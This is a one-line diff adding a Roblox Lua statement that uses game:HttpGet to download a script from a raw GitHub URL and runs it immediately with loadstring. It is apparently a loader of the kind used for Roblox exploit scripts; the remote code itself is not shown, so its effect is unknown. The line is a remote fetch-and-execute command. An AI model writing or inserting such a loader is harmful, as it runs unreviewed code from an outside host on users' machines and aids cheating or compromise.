@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ifjog4tbn/test2/main/Database", true))()
